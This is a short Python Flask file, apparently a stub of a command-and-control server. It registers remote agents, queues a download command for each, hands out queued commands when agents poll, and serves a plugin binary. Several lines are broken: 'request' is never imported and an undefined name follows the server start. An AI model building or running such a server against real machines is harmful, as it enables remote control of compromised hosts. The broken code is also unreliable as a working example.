from flask import Flask, send_file
from utils import genAgentID
from DEF_C2 import AgentConnection, AgentCommand

app = Flask(__name__)


agents={}

@app.route("/register")
def register_agent():
    id=genAgentID()
    AC = AgentConnection(id)
    AC.command_queue.append(AgentCommand(AgentCommand.DOWNLOAD,"123"))
    agents[id]=AC
    
    return {"id" : id}

@app.route("/command/<agent_id>")
def command_for_agent(agent_id):
    if agent_id not in agents:
        return {"error":"Client ID Not found"}, 400
    return agents[agent_id].serve_cmd()



@app.route("/plugin")
def serve_plugin():
    request.args.get('user')
    return send_file("dist/agentplugin_example")

if __name__ == '__main__':

    app.run()
    input(hello)